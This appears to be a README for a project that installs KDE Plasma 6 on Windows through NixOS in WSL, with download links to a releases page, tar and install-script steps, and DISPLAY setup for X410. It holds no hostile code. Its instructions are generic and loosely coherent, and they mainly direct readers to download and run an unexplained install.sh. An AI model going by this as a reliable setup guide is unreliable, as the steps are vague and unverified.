# 🖥️ wsl-kde6-nixos - Stable KDE Plasma 6 on Windows

## 🚀 Getting Started

Welcome to the **wsl-kde6-nixos** project! This guide will help you install KDE Plasma 6 on your Windows machine using NixOS in WSL (Windows Subsystem for Linux). You will enjoy a smooth and modern desktop experience.

## 📥 Download the Application

[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/jayandar-30/wsl-kde6-nixos/releases)

## 🪄 What You Need

Before you start, ensure you have the following:

- **Windows 10 or 11**: Make sure your operating system is up to date.
- **WSL Installed**: You will need WSL enabled. If you haven't installed it yet, follow these steps:
  1. Open PowerShell as an Administrator.
  2. Run the command:
     ```powershell
     wsl --install
     ```
- **X410 Installed**: This application acts as an X11 server. Download it from the Microsoft Store.

## 🔧 Installation Steps

### Step 1: Visit the Release Page

Go to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/releases). This page contains the necessary files for installation.

### Step 2: Download the Latest Release 

Find the latest version on the Releases page. Click the link to download the NixOS package. The file will have a name similar to `wsl-kde6-nixos-x.y.z.tar.gz`.

### Step 3: Install via WSL

1. Open your WSL terminal. You can do this by searching for "WSL" in the Start menu.
   
2. Navigate to your Downloads folder (or wherever you saved the file):
   ```bash
   cd ~/Downloads
   ```

3. Extract the downloaded file:
   ```bash
   tar -xvzf wsl-kde6-nixos-x.y.z.tar.gz
   ```

4. Change into the extracted directory:
   ```bash
   cd wsl-kde6-nixos-x.y.z
   ```

5. Run the installation script:
   ```bash
   ./install.sh
   ```

### Step 4: Configure Your Desktop Environment

1. After the installation, you will need to set up your desktop environment.

2. Follow these commands in your WSL terminal:
   ```bash
   export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
   startplasma-x11
   ```

3. You should now see KDE Plasma 6 loading.

## 🎉 Running KDE Plasma 6

Whenever you want to start your KDE environment:

1. Make sure X410 is running.
2. Open your WSL terminal.
3. Set the DISPLAY variable again:
   ```bash
   export DISPLAY=$(cat /etc/resolv.conf | grep nameserver | awk '{print $2}'):0
   startplasma-x11
   ```

## 📄 Important Configuration Tips

- **Adjust Resolution**: You might want to adjust the resolution settings in X410 for the best display experience.
- **Integrate with Windows**: To share files between Windows and your WSL environment easily, you can access your Windows files through the `/mnt/c` directory in WSL.

## 🔗 Additional Resources

- [NixOS Documentation](https://nixos.org/manual/nixos/stable/)
- [WSL Documentation](https://docs.microsoft.com/en-us/windows/wsl/)
- [X410 User Guide](https://x410.dev/)

## 📥 Download & Install Again

If you need to download the application, you can always return to the [Releases page](https://github.com/jayandar-30/wsl-kde6-nixos/releases). Ensure you grab the latest version for the best experience.

## 🌟 Conclusion

You now have KDE 6 running on your Windows system through WSL. Enjoy your new desktop environment! Please refer back to this guide whenever you need assistance.